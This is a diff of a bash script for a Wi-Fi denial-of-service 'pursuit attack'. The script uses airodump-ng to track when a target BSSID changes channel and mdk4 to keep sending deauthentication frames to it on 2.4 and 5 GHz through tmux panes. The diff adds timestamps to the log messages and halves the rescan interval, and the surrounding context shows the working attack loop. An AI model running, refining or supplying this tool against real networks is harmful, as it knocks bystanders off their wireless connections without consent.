@@ -30,7 +30,7 @@ stop_5_deauth() {
 
 run_airodump() {
 
-  echo "Scanning for channel change" >>"$log_file"
+	echo "$(date "+%F %T")| Scanning for channel change" >>"$log_file"
   # Remove the old files
   rm -f "dos_pm-01.csv"
   # Run airodump-ng in the tmux pane 1 for 30 seconds
@@ -82,13 +82,13 @@ run_deauth_on_channel() {
   # Usage: run_deauth_on_channel <BSSID> <channel>
   if [ "$2" -gt 13 ]; then
     if [ $was_5g_deauthing -eq 0 ]; then
-      echo "Starting 5GHz deauth on $1 @ $2" >>"$log_file"
+	    echo "$(date "+%F %T")| Starting 5GHz deauth on $1 @ $2" >>"$log_file"
     fi
     tmux send-keys -t 3 C-c
     mdk4_deauth "$scan_d5_if" "$1" "$2" 3
     was_5g_deauthing=1
   else
-    echo "Starting 2GHz deauth on $1 @ $2" >>"$log_file"
+    echo "$(date "+%F %T")| Starting 2GHz deauth on $1 @ $2" >>"$log_file"
     tmux send-keys -t 2 C-c
     mdk4_deauth "$d2_if" "$1" "$2" 2
   fi
@@ -100,7 +100,7 @@ check_restarts() {
     channel=$(echo "$line" | cut -d ' ' -f2)
 
     if [ ! -f "$old_channel_file" ]; then
-      echo "Fresh attack. Starting deauth on $bssid" >>"$log_file"
+      echo "$(date "+%F %T")| Fresh attack. Starting deauth on $bssid" >>"$log_file"
       run_deauth_on_channel "$bssid" "$channel"
       continue
     fi
@@ -108,7 +108,7 @@ check_restarts() {
     has_changed "$bssid"
     if [ $? -eq 1 ]; then
       old=$(grep "$bssid" "$old_channel_file" | cut -d ' ' -f2)
-      echo "Channel changed for $bssid: $old -> $channel" >>"$log_file"
+      echo "$(date "+%F %T")| Channel changed for $bssid: $old -> $channel" >>"$log_file"
       run_deauth_on_channel "$bssid" "$channel"
     else
       # If 5G was deauthing
@@ -133,7 +133,7 @@ create_tmux_session
 rm -rf "$log_file" "$old_channel_file" >/dev/null 2>&1
 
 # Log in pane 1
-echo "Starting DOS pursuit attack" >>"$log_file"
+echo "$(date "+%F %T")| Starting DOS pursuit attack" >>"$log_file"
 tmux send-keys -t 0 "tail -f $log_file" Enter
 tmux select-pane -t 0
 
@@ -151,5 +151,5 @@ while true; do
   check_restarts
 
   cp "$channel_file" "$old_channel_file"
-  sleep 600
+  sleep 300
 done
